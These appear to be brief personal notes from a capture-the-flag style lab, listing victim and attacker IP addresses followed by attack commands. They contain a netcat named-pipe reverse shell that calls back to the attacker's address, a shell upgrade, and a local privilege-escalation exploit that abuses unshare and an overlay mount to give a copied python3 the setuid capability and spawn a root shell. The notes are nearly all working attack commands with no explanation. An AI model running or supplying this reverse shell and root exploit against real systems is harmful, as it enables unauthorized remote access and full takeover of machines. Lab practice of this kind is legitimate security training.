## Victim

10.129.229.217

New Vic 10.129.229.50

tun0  10.10.14.2

## Reverse Shell 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1337 >/tmp/f

python3 -c 'import pty;pty.spawn("/bin/bash")'
 
## Exploit

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o 
rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import 
os;os.setuid(0);os.system("id")'

## root shell

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'